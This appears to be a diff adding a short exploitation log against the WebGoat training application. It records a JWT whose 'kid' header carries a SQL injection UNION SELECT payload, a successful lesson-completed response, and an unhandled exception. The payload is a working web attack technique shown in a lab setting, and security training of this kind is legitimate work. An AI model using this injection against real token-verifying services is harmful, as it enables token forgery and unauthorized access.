@@ -1,0 +1,7 @@
+### V6 POST /JWT/kid/delete, kid with UNION SELECT
+>>> POST /WebGoat/JWT/kid/delete  token=<header.kid="x' UNION SELECT 'deletingTom' FROM INFORMATION_SCHEMA.SYSTEM_USERS --">
+<<< HTTP 200
+<<< { "lessonCompleted" : true, "feedback" : "Congratulations. You have successfully completed the assignment.", "feedbackArgs" : null, "output" : null, "outputArgs" : null, "assignment" : "JWTHeaderKIDEndpoint", "attemptWasMade" : true }
+
+<<< unhandled exception: ServletException: Request processing failed: java.lang.IllegalArgumentException: Missing argument
+
